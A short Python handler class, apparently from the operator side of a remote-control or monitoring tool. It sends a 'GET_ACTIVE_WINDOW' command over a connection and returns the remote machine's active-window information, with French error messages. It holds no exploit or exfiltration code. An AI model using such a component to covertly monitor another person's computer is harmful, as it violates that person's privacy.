# core/window_tracker_handler.py
class WindowTrackerHandler:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager

    def get_active_window_info(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"GET_ACTIVE_WINDOW")
            return self.conn_manager.conn.recv(4096).decode('utf-8')
        except Exception as e:
            return f"[!] Erreur: {str(e)}"